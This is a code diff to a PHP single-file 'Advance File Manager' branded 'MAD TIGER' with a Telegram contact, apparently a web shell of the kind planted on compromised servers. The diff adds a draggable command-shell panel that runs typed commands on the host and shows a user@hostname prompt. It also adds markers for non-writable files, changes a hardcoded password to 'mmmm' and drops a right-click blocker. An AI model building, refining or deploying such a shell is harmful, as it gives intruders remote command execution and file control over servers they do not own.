@@ -8,9 +8,12 @@ ini_set('error_log', 'php_errors.log'); // Specify error log file
 session_start();
 
 // ---------- CONFIG ----------
-$password = "mama"; // Change this!
+$password = "mmmm"; // Change this!
 $cookieName = "filemgr_cookie_consent";
-$cmdPanelCookie = "filemgr_cmd_panel";
+$cmdVisibleCookie = "filemgr_cmd_visible";
+$cmdMinimizedCookie = "filemgr_cmd_minimized";
+$cmdExpandedCookie = "filemgr_cmd_expanded";
+$cmdPositionCookie = "filemgr_cmd_position";
 $securePerms = 0600; // Restrictive permissions (read/write for owner only)
 // ----------------------------
 
@@ -53,9 +56,15 @@ $serverOs = php_uname('s') . ' ' . php_uname('r');
 $serverSoftware = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';
 $certificateInfo = [
     'status' => 'Valid',
-'issuer' => 'Internal CA',
-'valid_until' => date('Y-m-d H:i:s', strtotime('+1 year')),
+    'issuer' => 'Internal CA',
+    'valid_until' => date('Y-m-d H:i:s', strtotime('+1 year')),
 ];
+// ----------------------------
+
+// -------- TERMINAL PROMPT --------
+$username = get_current_user() ?: trim(shell_exec('whoami'));
+$hostname = gethostname() ?: 'localhost';
+$cmdPrompt = "$username@$hostname #:";
 // ----------------------------
 
 // -------- AUTH --------
@@ -250,11 +259,27 @@ if (isset($_POST['clear_history'])) {
 }
 // -------------------------
 
-// -------- TOGGLE CMD PANEL --------
-$showCmdPanel = isset($_COOKIE[$cmdPanelCookie]) ? $_COOKIE[$cmdPanelCookie] === '1' : true;
+// -------- CMD PANEL STATE --------
+$showCmdPanel = isset($_COOKIE[$cmdVisibleCookie]) ? $_COOKIE[$cmdVisibleCookie] === '1' : true;
+$isMinimized = isset($_COOKIE[$cmdMinimizedCookie]) ? $_COOKIE[$cmdMinimizedCookie] === '1' : false;
+$isExpanded = isset($_COOKIE[$cmdExpandedCookie]) ? $_COOKIE[$cmdExpandedCookie] === '1' : false;
+$cmdPosition = isset($_COOKIE[$cmdPositionCookie]) ? json_decode($_COOKIE[$cmdPositionCookie], true) : ['top' => '80px', 'left' => 'calc(100% - 370px)'];
+
 if (isset($_POST['toggle_cmd'])) {
     $showCmdPanel = !$showCmdPanel;
-    setcookie($cmdPanelCookie, $showCmdPanel ? '1' : '0', time() + 31536000, '/', '', isset($_SERVER['HTTPS']), true);
+    setcookie($cmdVisibleCookie, $showCmdPanel ? '1' : '0', time() + 31536000, '/', '', isset($_SERVER['HTTPS']), true);
+    header("Location: ?");
+    exit;
+}
+if (isset($_POST['minimize_cmd'])) {
+    $isMinimized = !$isMinimized;
+    setcookie($cmdMinimizedCookie, $isMinimized ? '1' : '0', time() + 31536000, '/', '', isset($_SERVER['HTTPS']), true);
+    header("Location: ?");
+    exit;
+}
+if (isset($_POST['expand_cmd'])) {
+    $isExpanded = !$isExpanded;
+    setcookie($cmdExpandedCookie, $isExpanded ? '1' : '0', time() + 31536000, '/', '', isset($_SERVER['HTTPS']), true);
     header("Location: ?");
     exit;
 }
@@ -285,6 +310,7 @@ $pathDisplay = $pathLinks ? '📂 Dir: /' . implode('/', $pathLinks) : '📂 Dir
     --bg: #0f0f0f;
     --input-bg: #000;
     --accent: #00cc00;
+    --non-writable: #cccccc;
 }
 body {
     background: var(--bg);
@@ -353,10 +379,13 @@ th {
 td a {
     margin-right: 10px;
 }
-input, button, textarea, select {
+.non-writable {
+    color: var(--non-writable);
+}
+input, button, textarea {
     background: var(--input-bg);
     color: var(--primary);
-    border: 1px solid var(--primary);
+    border: none;
     padding: 10px;
     border-radius: 4px;
     font-family: 'Courier New', monospace;
@@ -374,7 +403,7 @@ button:hover, input[type="submit"]:hover {
 }
 textarea {
     width: 100%;
-    height: 150px;
+    height: 100px;
     resize: vertical;
 }
 .cookie-banner {
@@ -412,36 +441,67 @@ textarea {
     box-shadow: 0 0 5px var(--primary);
 }
 .cmd-panel {
-    position: fixed;
-    top: 80px;
-    right: 20px;
+    position: absolute;
+    top: <?= sanitize($cmdPosition['top']) ?>;
+    left: <?= sanitize($cmdPosition['left']) ?>;
     width: 350px;
-    background: #1a1a1a;
-    padding: 15px;
+    background: #000;
+    padding: 10px;
     border: 1px solid var(--primary);
-    border-radius: 8px;
+    border-radius: 4px;
     box-shadow: 0 0 10px var(--primary);
-    animation: slideIn 0.5s;
-    transition: opacity 0.3s, transform 0.3s;
+    transition: width 0.3s;
+    z-index: 1000;
 }
 .cmd-panel.hidden {
-    opacity: 0;
-    transform: translateX(100%);
-    pointer-events: none;
+    display: none;
 }
-.cmd-panel select {
-    width: 100%;
-    margin-bottom: 10px;
+.cmd-panel.minimized .cmd-content {
+    display: none;
+}
+.cmd-panel.expanded {
+    width: 500px;
+}
+.cmd-panel h3 {
+    margin: 0 0 10px;
+    cursor: move;
+    user-select: none;
+    background: #1a1a1a;
+    padding: 5px;
+    border-radius: 4px;
+    text-align: center;
+}
+.cmd-panel .cmd-content {
+    display: block;
+}
+.cmd-panel .cmd-prompt {
+    color: var(--primary);
+    margin-bottom: 5px;
 }
 .cmd-panel textarea {
-    height: 100px;
+    background: #000;
+    color: var(--primary);
+    border: 1px solid #333;
+    padding: 5px;
 }
 .cmd-panel pre {
     background: #000;
+    color: var(--primary);
     padding: 10px;
+    border: 1px solid #333;
     border-radius: 4px;
     max-height: 200px;
     overflow-y: auto;
+}
+.cmd-controls {
+    margin-bottom: 10px;
+    text-align: right;
+}
+.cmd-controls button {
+    margin-left: 5px;
+    padding: 5px 10px;
+    background: #1a1a1a;
+    border: 1px solid var(--primary);
 }
 .cmd-history {
     margin-top: 15px;
@@ -530,6 +590,82 @@ function updateClock() {
 }
 setInterval(updateClock, 1000);
 
+// Command panel state management
+function setCookie(name, value) {
+    document.cookie = name + "=" + value + "; path=/; max-age=31536000; SameSite=Strict" + (window.location.protocol === 'https:' ? '; Secure' : '');
+}
+
+function toggleCmdPanel() {
+    const cmdPanel = document.querySelector('.cmd-panel');
+    const toggleBtn = document.getElementById('toggleCmd');
+    const isHidden = !cmdPanel.classList.contains('hidden');
+    cmdPanel.classList.toggle('hidden');
+    setCookie('<?= $cmdVisibleCookie ?>', isHidden ? '0' : '1');
+    toggleBtn.textContent = isHidden ? 'Show Command Shell' : 'Hide Command Shell';
+}
+
+function minimizeCmdPanel() {
+    const cmdPanel = document.querySelector('.cmd-panel');
+    const isMinimized = !cmdPanel.classList.contains('minimized');
+    cmdPanel.classList.toggle('minimized');
+    setCookie('<?= $cmdMinimizedCookie ?>', isMinimized ? '1' : '0');
+}
+
+function expandCmdPanel() {
+    const cmdPanel = document.querySelector('.cmd-panel');
+    const isExpanded = !cmdPanel.classList.contains('expanded');
+    cmdPanel.classList.toggle('expanded');
+    setCookie('<?= $cmdExpandedCookie ?>', isExpanded ? '1' : '0');
+}
+
+// Draggable command panel
+function makeDraggable() {
+    const cmdPanel = document.querySelector('.cmd-panel');
+    const header = cmdPanel.querySelector('h3');
+    let isDragging = false;
+    let currentX = parseInt(cmdPanel.style.left || '0');
+    let currentY = parseInt(cmdPanel.style.top || '0');
+    let initialX, initialY;
+
+    header.addEventListener('mousedown', startDragging);
+
+    function startDragging(e) {
+        initialX = e.clientX - currentX;
+        initialY = e.clientY - currentY;
+        isDragging = true;
+        header.style.cursor = 'grabbing';
+        document.addEventListener('mousemove', onDragging);
+        document.addEventListener('mouseup', stopDragging);
+    }
+
+    function onDragging(e) {
+        if (isDragging) {
+            currentX = e.clientX - initialX;
+            currentY = e.clientY - initialY;
+
+            // Bounds checking
+            const maxX = window.innerWidth - cmdPanel.offsetWidth;
+            const maxY = window.innerHeight - cmdPanel.offsetHeight;
+            currentX = Math.max(0, Math.min(currentX, maxX));
+            currentY = Math.max(0, Math.min(currentY, maxY));
+
+            cmdPanel.style.left = currentX + 'px';
+            cmdPanel.style.top = currentY + 'px';
+        }
+    }
+
+    function stopDragging() {
+        isDragging = false;
+        header.style.cursor = 'move';
+        setCookie('<?= $cmdPositionCookie ?>', JSON.stringify({
+            top: cmdPanel.style.top,
+            left: cmdPanel.style.left
+        }));
+        document.removeEventListener('mousemove', onDragging);
+        document.removeEventListener('mouseup', stopDragging);
+    }
+}
+
 // Smooth scroll and animations
 document.addEventListener('DOMContentLoaded', () => {
     updateClock();
@@ -538,7 +674,7 @@ document.addEventListener('DOMContentLoaded', () => {
             if (!link.href.includes('logout') && !link.href.includes('delete') && !link.href.includes('download')) {
                 e.preventDefault();
                 document.body.style.opacity = '0';
-        setTimeout(() => window.location = link.href, 300);
+                setTimeout(() => window.location = link.href, 300);
             }
         });
     });
@@ -550,20 +686,26 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     });
 
-    // Toggle button text
+    // Initialize toggle button text and event listeners
     const toggleBtn = document.getElementById('toggleCmd');
     const cmdPanel = document.querySelector('.cmd-panel');
-    if (cmdPanel.classList.contains('hidden')) {
-        toggleBtn.textContent = 'Show Command Shell';
-    } else {
-        toggleBtn.textContent = 'Hide Command Shell';
-    }
-});
+    toggleBtn.textContent = cmdPanel.classList.contains('hidden') ? 'Show Command Shell' : 'Hide Command Shell';
+    
+    // Bind toggle functions
+    toggleBtn.addEventListener('click', (e) => {
+        if (e.target.type === 'submit') {
+            return;
+        }
+        e.preventDefault();
+        toggleCmdPanel();
+    });
+    
+    document.getElementById('minimizeCmdBtn').addEventListener('click', minimizeCmdPanel);
+    document.getElementById('closeCmdBtn').addEventListener('click', toggleCmdPanel);
+    document.getElementById('expandCmdBtn').addEventListener('click', expandCmdPanel);
 
-// Prevent right-click detection
-document.addEventListener('contextmenu', (e) => {
-    e.preventDefault();
-    return false;
+    // Initialize draggable
+    makeDraggable();
 });
 </script>
 </head>
@@ -572,7 +714,7 @@ document.addEventListener('contextmenu', (e) => {
 <div class="clock" id="clock"></div>
 
 <div class="banner">
-<h1>🛠️ Advance File Manager</h1>
+<h1><a href="?">🛠️ Advance File Manager</a></h1>
 <p>🦁 MAD TIGER</p>
 <p><a href="https://t.me/DevidLuice" target="_blank">Telegram: @DevidLuice</a></p>
 </div>
@@ -581,34 +723,34 @@ document.addEventListener('contextmenu', (e) => {
 <button type="submit" name="toggle_cmd" id="toggleCmd" class="toggle-cmd">Toggle Command Shell</button>
 </form>
 
-<div class="cmd-panel <?= $showCmdPanel ? '' : 'hidden' ?>">
+<div class="cmd-panel <?= $showCmdPanel ? '' : 'hidden' ?> <?= $isMinimized ? 'minimized' : '' ?> <?= $isExpanded ? 'expanded' : '' ?>">
 <h3>💻 Command Shell</h3>
-<form method="post">
-<select name="preset" onchange="if(this.value) document.querySelector('textarea[name=cmd]').value = this.value;">
-<option value="">Select a command...</option>
-<option value="ls -al">List Directory (ls -al)</option>
-<option value="whoami">Current User (whoami)</option>
-<option value="pwd">Current Path (pwd)</option>
-<option value="df -h">Disk Usage (df -h)</option>
-<option value="uptime">System Uptime (uptime)</option>
-</select>
-<textarea name="cmd" placeholder="Enter command..."></textarea>
-<button type="submit">Run</button>
-<button type="submit" name="clear_history">Clear History</button>
-</form>
-<?php if ($cmdOutput): ?>
-<pre><?= sanitize($cmdOutput) ?></pre>
-<?php endif; ?>
-<?php if (!empty($_SESSION['cmd_history'])): ?>
-<div class="cmd-history">
-<h4>Command History</h4>
-<ul>
-<?php foreach (array_reverse($_SESSION['cmd_history']) as $cmd): ?>
-<li><?= sanitize($cmd) ?></li>
-<?php endforeach; ?>
-</ul>
+<div class="cmd-controls">
+    <button id="minimizeCmdBtn">-</button>
+    <button id="closeCmdBtn">✖</button>
+    <button id="expandCmdBtn">□</button>
 </div>
-<?php endif; ?>
+<div class="cmd-content">
+    <div class="cmd-prompt"><?= sanitize($cmdPrompt) ?></div>
+    <form method="post">
+        <textarea name="cmd" placeholder="Enter command..."></textarea>
+        <button type="submit">Run</button>
+        <button type="submit" name="clear_history">Clear History</button>
+    </form>
+    <?php if ($cmdOutput): ?>
+    <pre><?= sanitize($cmdOutput) ?></pre>
+    <?php endif; ?>
+    <?php if (!empty($_SESSION['cmd_history'])): ?>
+    <div class="cmd-history">
+        <h4>Command History</h4>
+        <ul>
+        <?php foreach (array_reverse($_SESSION['cmd_history']) as $cmd): ?>
+        <li><?= sanitize($cmd) ?></li>
+        <?php endforeach; ?>
+        </ul>
+    </div>
+    <?php endif; ?>
+</div>
 </div>
 
 <div class="info-panel">
@@ -646,10 +788,13 @@ foreach (scandir('.') as $item) {
     $size = is_file($path) ? filesize($path) . ' B' : '-';
     $perms = substr(sprintf('%o', fileperms($path)), -4);
     $name = sanitize($item);
+    $isWritable = is_writable($path);
+    $nameClass = $isWritable ? '' : 'non-writable';
+    $lockIcon = $isWritable ? '' : '🔒 ';
     echo "<tr><td>";
     echo is_dir($path)
-    ? "📁 <a href='?dir=" . urlencode($path) . "'>{$name}</a>"
-    : "📄 {$name}";
+        ? "{$lockIcon}📁 <a href='?dir=" . urlencode($path) . "' class='$nameClass'>{$name}</a>"
+        : "{$lockIcon}📄 <span class='$nameClass'>{$name}</span>";
     echo "</td><td>{$size}</td><td>{$perms}</td><td>";
     if (!is_dir($path)) {
         echo "<a href='?edit=" . urlencode($path) . "'>✏️ Edit</a> ";
